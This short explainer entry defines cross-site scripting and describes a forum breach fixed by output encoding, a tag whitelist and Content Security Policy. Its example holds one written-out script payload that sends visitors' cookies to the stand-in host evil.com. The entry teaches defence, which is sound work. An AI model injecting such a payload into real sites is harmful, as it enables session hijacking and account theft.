## 368. What is XSS (Cross-Site Scripting)?

**XSS is an attack where attacker injects malicious scripts into web pages viewed by other users — scripts execute in victim's browser.**

It's about code injection — attacker's JavaScript runs in your users' browsers.

**Impact:**
- Session hijacking — steal cookies, session tokens
- Defacement — modify page content, display fake messages
- Keylogging — capture keystrokes, steal credentials

**Trade-off:**
- Any user input is potential XSS — comments, profiles, search queries
- Defense required at every input/output point
- False sense of security — "we sanitize input" but miss output encoding

**Real-world example:**
Our forum allowed users to post comments. Attacker posted: `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`. 500 users viewed comment — sessions stolen. Attacker accessed 500 accounts. Added output encoding — HTML entities, scripts display as text, don't execute. XSS: eliminated. But encoding broke rich text features — users couldn't bold/italic text. Added whitelist — allow <b>, <i>, <a> tags, strip everything else. Rich text: working. XSS: still blocked.

**Rule of thumb:** Output encode all user input — HTML entity encoding for HTML context. Whitelist allowed tags for rich text — don't blacklist (always miss something). Content Security Policy as additional layer — limits where scripts can load from.
